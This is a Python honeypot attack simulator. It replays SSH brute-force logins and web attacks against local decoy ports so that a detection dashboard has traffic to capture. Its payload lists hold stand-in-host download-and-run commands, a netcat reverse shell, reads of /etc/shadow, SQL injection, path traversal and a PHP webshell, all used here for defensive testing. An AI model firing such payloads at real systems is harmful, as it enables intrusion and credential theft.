"""
Honeypot Attack Pattern Simulator.
Simulates realistic, multi-vector cyberattack campaigns against the deployed SSH and HTTP honeypot decoys
to demonstrate real-time data capture, threat classification, and live dashboard visualization.
SAFETY: Runs only against localhost / designated lab decoy ports (2222 and 8080).
"""
import sys
import time
import socket
import logging
import requests
import paramiko

if sys.stdout.encoding != 'utf-8':
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        pass

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] [Attack-Simulator] %(message)s"
)
logger = logging.getLogger("simulator")

SSH_HOST = "127.0.0.1"
SSH_PORT = 2222
HTTP_BASE_URL = "http://127.0.0.1:8080"
BACKEND_BASE_URL = "http://127.0.0.1:8000"

def banner():
    print("\n" + "=" * 70)
    print("  [+] INITIATING AUTOMATED HONEYPOT ATTACK SIMULATION")
    print("  Target Services: SSH (Port 2222) | HTTP (Port 8080)")
    print("=" * 70 + "\n")

def simulate_ssh_bruteforce_and_shell():
    """Simulate SSH brute force dictionary attack followed by interactive dropper commands."""
    logger.info("--> [STAGE 1] Launching SSH Brute-Force & Keystroke Injection...")
    
    credentials = [
        ("support", "support123"),
        ("oracle", "oracle2026"),
        ("admin", "admin1234"),
        ("root", "123456"),
        ("root", "toor"),
        ("ubuntu", "ubuntu"),
    ]

    for user, pwd in credentials:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            logger.info(f"    [SSH Probe] Testing credential pair: {user} / {pwd}")
            client.connect(
                hostname=SSH_HOST,
                port=SSH_PORT,
                username=user,
                password=pwd,
                timeout=4,
                allow_agent=False,
                look_for_keys=False
            )
            logger.info(f"    [SSH Shell] Access granted as '{user}'! Executing dropper payloads...")
            
            # Open interactive shell channel
            channel = client.invoke_shell()
            time.sleep(0.5)
            
            commands = [
                "uname -a\n",
                "id\n",
                "cat /etc/passwd\n",
                "wget http://185.220.101.5/cryptominer.sh -O /tmp/miner.sh; chmod +x /tmp/miner.sh\n",
                "cat /etc/shadow\n",
                "curl -s http://evil-c2.net/backdoor.sh | bash\n",
                "exit\n"
            ]
            
            for cmd in commands:
                channel.send(cmd)
                time.sleep(0.4)
                if channel.recv_ready():
                    channel.recv(4096)
                    
            client.close()
            break
        except paramiko.AuthenticationException:
            logger.info(f"    [SSH Probe] Auth rejected for {user}:{pwd} (expected)")
        except Exception as e:
            logger.warning(f"    [SSH Probe] Connection error: {e}")
            break
        time.sleep(0.3)

def simulate_http_web_attacks():
    """Simulate Web SQLi, Command Injection, Botnet Scanners, and Path Traversal."""
    logger.info("\n--> [STAGE 2] Launching Web Application Attack Vectors (HTTP 8080)...")

    # 1. Web SQL Injection against Login Form
    sqli_payloads = [
        "admin' OR '1'='1' --",
        "admin' OR 1=1 #",
        "' UNION SELECT null, username, password FROM users --",
        "'; DROP TABLE sessions; --"
    ]
    for sqli in sqli_payloads:
        try:
            logger.info(f"    [Web SQLi] Submitting: username='{sqli}'")
            requests.post(
                f"{HTTP_BASE_URL}/admin/login",
                data={"username": sqli, "password": "password123"},
                timeout=2
            )
        except Exception as e:
            logger.warning(f"    [Web SQLi] Request failed: {e}")
        time.sleep(0.2)

    # 2. Command Injection against Diagnostic Ping Tool
    cmdi_payloads = [
        "127.0.0.1; cat /etc/passwd",
        "127.0.0.1 | whoami",
        "127.0.0.1 && wget http://evil.org/malware.sh",
        "127.0.0.1; nc -e /bin/sh 198.51.100.45 4444"
    ]
    for cmd in cmdi_payloads:
        try:
            logger.info(f"    [Web Cmd Injection] Probing ping endpoint: host='{cmd}'")
            requests.get(f"{HTTP_BASE_URL}/api/tools/ping", params={"host": cmd}, timeout=2)
        except Exception as e:
            logger.warning(f"    [Web Cmd Injection] Request failed: {e}")
        time.sleep(0.2)

    # 3. Botnet / Vulnerability Scanner Recon (Nikto, sqlmap, Masscan User-Agents)
    scanner_probes = [
        ("Mozilla/5.0 (compatible; Nikto/2.1.6; +http://cirt.net/nikto/)", "/.env"),
        ("sqlmap/1.5.2#stable (http://sqlmap.org)", "/api/v1/users?id=1'"),
        ("Masscan/1.0", "/actuator/env"),
        ("Nmap Scripting Engine", "/wp-config.php"),
        ("python-requests/2.28.1 (DarkBot)", "/config.json"),
    ]
    for ua, path in scanner_probes:
        try:
            logger.info(f"    [Botnet Recon] User-Agent: '{ua[:35]}...' Path: '{path}'")
            requests.get(
                f"{HTTP_BASE_URL}{path}",
                headers={"User-Agent": ua},
                timeout=2
            )
        except Exception as e:
            logger.warning(f"    [Botnet Recon] Request failed: {e}")
        time.sleep(0.2)

    # 4. Path Traversal
    traversal_paths = [
        "/api/v1/files?path=../../../../etc/passwd",
        "/download?file=..\\..\\..\\..\\windows\\win.ini",
        "/view?doc=../../../../var/log/auth.log"
    ]
    for tp in traversal_paths:
        try:
            logger.info(f"    [Path Traversal] Requesting: '{tp}'")
            requests.get(f"{HTTP_BASE_URL}{tp}", timeout=2)
        except Exception as e:
            logger.warning(f"    [Path Traversal] Request failed: {e}")
        time.sleep(0.2)

    # 5. Malicious File Upload Trap
    try:
        logger.info("    [File Upload] Submitting fake webshell 'cmd.php'...")
        files = {"file": ("cmd.php", "<?php system($_GET['cmd']); ?>", "application/x-php")}
        requests.post(f"{HTTP_BASE_URL}/api/v1/upload", files=files, timeout=2)
    except Exception as e:
        logger.warning(f"    [File Upload] Request failed: {e}")

def main():
    banner()
    simulate_ssh_bruteforce_and_shell()
    simulate_http_web_attacks()
    print("\n" + "=" * 70)
    print("  ✅ ATTACK SIMULATION CAMPAIGN COMPLETED SUCCESSFULLY!")
    print("  Open the Cyber-SOC Dashboard at: http://127.0.0.1:8000")
    print("  Inspect captured telemetry, risk score matrix, and threat origins.")
    print("=" * 70 + "\n")

if __name__ == "__main__":
    main()
